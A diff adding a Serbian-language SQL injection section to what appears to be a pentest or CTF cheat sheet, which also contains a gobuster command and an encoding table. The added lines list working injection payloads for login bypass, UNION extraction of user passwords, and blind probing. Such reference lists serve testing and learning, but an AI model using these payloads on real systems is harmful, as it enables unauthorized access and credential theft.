@@ -117,3 +117,42 @@ gobuster dir -u http://target -w common.txt -x zip,sql,txt
 | Random string + key              | XOR                 | Nečitljivo, ali ima pattern             | CyberChef                    | XOR Brute Force                           |
 | 0x48656c6c6f                     | Hex (0x)            | Počinje sa 0x                            | CyberChef                    | From Hex                                  |
 | admin:password                  | Credentials (plain) | Već čitljivo                             | N/A                          | Nema potrebe za decode                    |
+
+#SQL Injection
+## ✔ Test ranjivosti (error-based)
+'
+"
+`
+
+## ✔ Basic zaobilaženje (login / autentifikacija)
+' OR 1=1 --
+' OR '1'='1 --
+admin' --
+' OR ''='
+
+## ✔ Boolean test (tačno / netačno)
+' AND 1=1 --
+' AND 1=2 --
+' AND 'a'='a
+' AND 'a'='b
+
+## ✔ UNION test (izvlačenje podataka)
+' UNION SELECT null, null --
+' UNION SELECT database(), user() --
+' UNION SELECT user, password FROM users --
+
+## ✔ Otkrivanje broja kolona
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+
+## ✔ Blind SQL Injection (bez direktnog outputa)
+' AND LENGTH(database())=4 --
+' AND SUBSTRING(database(),1,1)='d' --
+' AND ASCII(SUBSTRING(database(),1,1))>100 --
+
+## ✔ Indikatori ranjivosti
+- prikazana SQL greška  
+- uspešno zaobilaženje logina  
+- vraćeno više rezultata nego očekivano  
+- razlika između TRUE / FALSE upita  
